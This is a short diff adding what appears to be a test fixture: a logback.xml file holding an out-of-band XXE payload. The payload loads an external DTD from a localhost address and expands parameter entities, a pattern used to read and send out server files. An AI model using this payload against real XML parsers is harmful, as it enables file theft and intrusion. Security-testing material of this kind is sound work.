@@ -1,0 +1,4 @@
+# file logback.xml from the server 127.0.0.1:1337
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE a [ <!ENTITY % remote SYSTEM "http://127.0.0.1:8080/file.dtd">%remote;%int;]>
+<a>&trick;</a>
